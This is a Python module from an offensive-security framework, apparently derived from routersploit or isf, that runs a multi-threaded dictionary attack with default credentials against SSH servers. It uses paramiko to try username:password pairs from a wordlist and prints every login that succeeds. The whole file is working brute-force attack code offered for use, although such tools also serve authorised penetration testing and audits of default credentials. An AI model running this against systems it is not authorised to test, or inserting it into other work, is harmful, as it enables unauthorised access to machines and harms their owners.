import threading
import socket
import paramiko

import Wordlists
from Base.Exploits import Exploit, Option
from Utils import multi, print_error, print_success, print_status, print_table, boolify, LockedIterator


class Exploit(Exploit):
    """
    Module perform dictionary attack with default credentials against SSH service.
    If valid credentials are found, they are displayed to the user.
    """
    __info__ = {
        'name': 'credentials/ssh/default',
        'display_name': 'SSH Default Creds',
        'description': 'Module perform dictionary attack with default credentials against SSH service. '
                       'If valid credentials are found, they are displayed to the user.',
        'authors': [
            'Marcin Bury <marcin.bury[at]reverse-shell.com>',
            'D0ubl3G <d0ubl3g[at]protonmail.com>',
        ],
        'references': [
            'https://github.com/dark-lbp/isf',
        ],
        'devices': [
            'Multi',
        ],
    }

    target = Option('', 'Target IP address or file with target:port (file://)')
    port = Option(22, 'Target port')
    threads = Option(8, 'Numbers of threads')
    defaults = Option(Wordlists.defaults, 'User:Pass or file with default credentials (file://)')
    verbosity = Option('yes', 'Display authentication attempts')
    stop_on_success = Option('yes', 'Stop on first valid authentication attempt')

    credentials = []

    def run(self):
        self.credentials = []
        self.attack()

    @multi
    def attack(self):
        ssh = paramiko.SSHClient()

        try:
            ssh.connect(self.target, port=self.port)
        except socket.error:
            print_error("Connection error: %s:%s" % (self.target, str(self.port)))
            ssh.close()
            return
        except:
            pass

        ssh.close()

        if self.defaults.startswith('file://'):
            defaults = open(self.defaults[7:], 'r')
        else:
            defaults = [self.defaults]

        collection = LockedIterator(defaults)
        self.run_threads(self.threads, self.target_function, collection)

        if len(self.credentials):
            print_success("Credentials found!")
            headers = ("Target", "Port", "Login", "Password")
            print_table(headers, *self.credentials)
        else:
            print_error("Credentials not found")

    def target_function(self, running, data):
        module_verbosity = boolify(self.verbosity)
        name = threading.current_thread().name
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        print_status(name, 'process is starting...', verbose=module_verbosity)

        while running.is_set():
            try:
                line = data.next().split(":")
                user = line[0].strip()
                password = line[1].strip()
                ssh.connect(self.target, int(self.port), timeout=5, username=user, password=password)
            except StopIteration:
                break
            except paramiko.ssh_exception.SSHException as err:
                ssh.close()

                print_error("Target: {}:{} {}: {} Username: '{}' Password: '{}'"
                            .format(self.target, self.port, name, err, user, password), verbose=module_verbosity)
            else:
                if boolify(self.stop_on_success):
                    running.clear()

                print_success("Target: {}:{} {} Authentication Succeed - Username: '{}' Password: '{}'"
                              .format(self.target, self.port, name, user, password), verbose=module_verbosity)
                self.credentials.append((self.target, self.port, user, password))

        print_status(name, 'process is terminated.', verbose=module_verbosity)
